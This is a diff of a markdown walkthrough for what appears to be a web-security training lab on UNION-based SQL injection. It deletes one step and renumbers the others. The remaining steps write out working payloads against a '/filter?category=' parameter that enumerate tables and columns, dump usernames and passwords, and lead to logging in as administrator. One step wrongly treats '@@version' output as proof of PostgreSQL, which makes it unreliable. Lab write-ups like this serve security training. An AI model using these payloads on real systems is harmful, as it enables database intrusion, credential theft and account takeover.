@@ -11,27 +11,23 @@
    - Test: `/filter?category=Gifts' ORDER BY 3--`
    - Result: Error (confirms 2 columns)
 
-### 3. Verify column data types:
-   - Test: `/filter?category=Gifts' UNION SELECT '1', '2'--`
-   - Result: Values '1' and '2' displayed (confirms string compatibility)
-
-### 4. Verify database version:
+### 3. Verify database version:
    - Test: `/filter?category=Gifts' UNION SELECT NULL,@@version --`
    - Result: Database version information displayed. So the database is PostgreSQL.
 
-### 5. List the database contents:
+### 4. List the database contents:
    - Test: `/filter?category=Gifts' UNION SELECT NULL,table_name FROM information_schema.tables --`
    - Result: List of tables in the database. There are many tables, we don't know which one has the username and password.
 
-### 6. List the columns like %username% and %password%:
+### 5. List the columns like %username% and %password%:
    - Test: `/filter?category=Gifts' UNION SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%username%' OR column_name LIKE '%password%' --`
    - Result: You'll see a table starts with users_... and its columns. Example: users_ylbcwc and its columns are username_fyrfao and password_izzwei.
 
-### 7. Extract the username and password:
+### 6. Extract the username and password:
    - Test: `/filter?category=Gifts' UNION SELECT [YOUR COLUMN NAME],[YOUR COLUMN NAME] FROM [YOUR_TABLE_NAME]--`
    - Result: administrator and password
 
-### 8. Login to the administrator account
+### 7. Login to the administrator account
 
 ## Automated Solution
 
